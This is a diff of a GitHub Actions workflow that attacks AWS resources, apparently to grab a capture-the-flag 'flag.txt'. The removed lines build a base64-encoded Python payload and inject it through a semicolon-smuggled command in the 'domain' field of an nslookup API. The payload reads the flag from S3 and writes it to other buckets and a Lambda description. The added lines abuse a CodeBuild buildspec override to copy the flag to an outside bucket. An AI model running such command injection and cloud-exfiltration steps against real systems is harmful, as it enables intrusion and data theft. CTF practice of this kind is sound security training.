@@ -19,58 +19,33 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Check current description (baseline before injection)
+      - name: List and inspect CodeBuild projects
         run: |
-          aws lambda get-function-configuration \
-            --function-name nslookupv2 --region us-east-1 \
-            --query '{Description: Description, Environment: Environment}'
+          echo "===== list projects ====="
+          aws codebuild list-projects --region us-east-1 || echo "denied"
+          echo "===== batch get projects ====="
+          PROJECTS=$(aws codebuild list-projects --region us-east-1 --query 'projects' --output text 2>/dev/null)
+          if [ -n "$PROJECTS" ]; then
+            aws codebuild batch-get-projects --names $PROJECTS --region us-east-1
+          fi
 
-      - name: Build exploit Python and inject via base64
+      - name: Start CodeBuild with overridden commands to read flag
         run: |
-          printf 'import boto3\n' > /tmp/ex.py
-          printf 'result = "START"\n' >> /tmp/ex.py
-          printf 'try:\n' >> /tmp/ex.py
-          printf '    s3 = boto3.client("s3")\n' >> /tmp/ex.py
-          printf '    flag = s3.get_object(Bucket="codec4f26c862a321ef5",Key="flag.txt")["Body"].read().decode().strip()\n' >> /tmp/ex.py
-          printf '    result = "S3OK:" + flag\n' >> /tmp/ex.py
-          printf 'except Exception as e:\n' >> /tmp/ex.py
-          printf '    result = "S3ERR:" + str(e)[:120]\n' >> /tmp/ex.py
-          printf '    flag = result\n' >> /tmp/ex.py
-          printf 'lmb = boto3.client("lambda", region_name="us-east-1")\n' >> /tmp/ex.py
-          printf 'try:\n' >> /tmp/ex.py
-          printf '    lmb.update_function_configuration(FunctionName="nslookupv2", Description=result[:250])\n' >> /tmp/ex.py
-          printf '    result += " LMBUPDATE_OK"\n' >> /tmp/ex.py
-          printf 'except Exception as e:\n' >> /tmp/ex.py
-          printf '    result += " LMBERR:" + str(e)[:120]\n' >> /tmp/ex.py
-          printf 'for b in ["site781fe43f26b9eba3","platform-bucket-009661764077-us-east-1","codec4f26c862a321ef5"]:\n' >> /tmp/ex.py
-          printf '    try:\n' >> /tmp/ex.py
-          printf '        s3.put_object(Bucket=b,Key="out.txt",Body=result.encode())\n' >> /tmp/ex.py
-          printf '        print("PUT_OK:" + b)\n' >> /tmp/ex.py
-          printf '    except Exception as e:\n' >> /tmp/ex.py
-          printf '        print("PUT_FAIL:" + b + ":" + str(e)[:80])\n' >> /tmp/ex.py
-          printf 'print(result)\n' >> /tmp/ex.py
-          echo "===== exploit script ====="
-          cat /tmp/ex.py
-          B64=$(base64 -w0 /tmp/ex.py)
-          echo "===== injecting ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d "{\"domain\":\";echo ${B64}|base64 -d|python3 2>&1\"}"
+          PROJECT=$(aws codebuild list-projects --region us-east-1 --query 'projects[0]' --output text 2>/dev/null)
+          echo "Project: $PROJECT"
+          if [ -n "$PROJECT" ] && [ "$PROJECT" != "None" ]; then
+            BUILD_ID=$(aws codebuild start-build \
+              --project-name "$PROJECT" \
+              --region us-east-1 \
+              --buildspec-override '{"version":"0.2","phases":{"build":{"commands":["aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt","cat /tmp/flag.txt","aws s3 cp /tmp/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"]}}}' \
+              --query 'build.id' --output text)
+            echo "Build ID: $BUILD_ID"
+            sleep 30
+            echo "===== build status ====="
+            aws codebuild batch-get-builds --ids "$BUILD_ID" \
+              --query 'builds[0].{Status:buildStatus,Logs:logs}' --region us-east-1
+          fi
 
-      - name: Wait for Lambda execution
-        run: sleep 12
-
-      - name: Read description back - did injection update it?
+      - name: Read flag from platform bucket if CodeBuild wrote it
         run: |
-          aws lambda get-function-configuration \
-            --function-name nslookupv2 --region us-east-1 \
-            --query '{Description: Description, Environment: Environment}'
-
-      - name: Try reading out.txt from all buckets
-        run: |
-          echo "===== site bucket ====="
-          aws s3 cp s3://site781fe43f26b9eba3/out.txt - || echo "not found"
-          echo "===== platform bucket ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/out.txt - || echo "not found"
-          echo "===== codec bucket ====="
-          aws s3 cp s3://codec4f26c862a321ef5/out.txt - || echo "not found"
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_out.txt - || echo "not found"
